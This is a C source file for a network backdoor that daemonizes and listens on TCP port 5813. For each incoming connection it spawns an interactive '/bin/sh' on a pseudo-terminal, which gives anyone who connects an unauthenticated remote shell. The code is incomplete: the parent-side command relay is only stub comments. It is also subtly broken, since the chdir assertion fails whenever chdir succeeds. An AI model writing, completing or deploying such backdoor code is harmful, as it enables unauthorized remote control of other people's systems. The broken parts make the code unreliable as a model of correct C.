#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <termios.h>
#include <unistd.h>

#define DOOR_PORT       5813
#define DOOR_LISTEN     5

/* Prints error log. */
static void
print_error(const char *error, int err)
{
    fprintf(stderr, "ERROR: %s (%s)\n", error, strerror(err));
}

/* Returns a binded socket listening on ANY_ADDR. */
static int
create_ptcp_socket(void)
{
    struct sockaddr_in sin;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        print_error("could not open socket", errno);
        goto err;
    }

    memset(&sin, 0, sizeof sin);
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_port = htons(DOOR_PORT);

    if (bind(sock, (struct sockaddr *)&sin, sizeof sin) == -1) {
        print_error("could not bind socket", errno);
        close(sock);
        goto err;
    }

    if (listen(sock, DOOR_LISTEN) == -1) {
        print_error("could not listen on socket", errno);
        close(sock);
        goto err;
    }

    return sock;
err:
    return -1;
}

/* Creates another fork to run bash and serves. */
static void
servant_run(int servant_sock)
{
    int pty_master, pty_slave;

    /* Creates master pty. */
    pty_master = posix_openpt(O_RDWR);
    if (pty_master < 0) {
        return;
    }
    if (grantpt(pty_master)) {
        goto err;
    }
    if (unlockpt(pty_master)) {
        goto err;
    }
    /* Open the slave pty. */
#ifdef _XOPEN_SOURCE
    pty_slave = open(ptsname(pty_master), O_RDWR);
#elif defined(_GNU_SOURCE)
    char buf[256] = {'\0'};

    ptsname_r(pty_master, buf, 256);
    pty_slave = open(buf, O_RDWR);
#else
#error "Do not support ptsname."
#endif

    if (fork()) {
        /* In master. */
        close(pty_slave);

        /* receives commands. */

        /* passes commands to child. */

        /* waits for execution result. */

        /* sends execution result back. */
    } else {
        struct termios term_settings;

        /* In slave, start a shell. */
        tcgetattr(pty_slave, &term_settings);
        cfmakeraw(&term_settings);
        tcsetattr(pty_slave, TCSANOW, &term_settings);
        close(pty_master);
        dup(pty_slave);
        dup(pty_slave);
        dup(pty_slave);
        execl("/bin/sh", "sh", "-i", NULL);
    }

err:
    close(pty_master);
}

/* Maintains an infinite loop for accepting the remote conneciton. */
static void
door_run(int ptcp_sock)
{
    for (;;) {
        struct sockaddr_in servant_sin;
        int servant_sin_len = sizeof servant_sin;
        int servant_sock;

        /* Waits to serve the door master. */
        servant_sock = accept(ptcp_sock, (struct sockaddr *) &servant_sin,
                              &servant_sin_len);
        if (servant_sock == -1) {
            continue;
        }

        /* Second fork to create the standalone servant. */
        if (fork()) {
            /* In parent, closes socket and go back to accept. */
            close(servant_sock);
        } else {
            /* In servant, serves~. */
            setsid();
            servant_run(servant_sock);
            close(servant_sock);
            break;
        }
    }
}


int
main(void)
{
    int ptcp_sock, pid;
    int err = 0;

    ptcp_sock = create_ptcp_socket();
    if (ptcp_sock == -1) {
        err = errno;
        print_error("socket creation failed", err);
        goto err;
    }
    fflush(NULL);

    /* First fork to create a standalone accepting daemon. */
    pid = fork();
    if (pid > 0) {
        goto exit;
    } else if (pid == -1 ) {
        err = errno;
        print_error("fork failed", err);
        goto exit;
    }

    /* Inside child process, sets it up first. */
    setsid();
    assert(chdir("/") > 0);
    close(0);
    close(1);
    close(2);

    /* Runs the door. */
    door_run(ptcp_sock);

exit:
    close(ptcp_sock);
err:
    return err;
}
